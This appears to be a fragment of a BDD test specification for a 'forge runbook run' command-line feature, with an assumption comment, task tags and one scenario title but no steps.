  # [ASSUMPTION: confidence=medium] `forge runbook run <path>` reads the JSON, persists the runbook in the store, then executes it so results and the pointer have a durable home.
  @task:TASK-RBX-005
  @key-example @smoke
  Scenario: Running a runbook from the command line loads and executes it
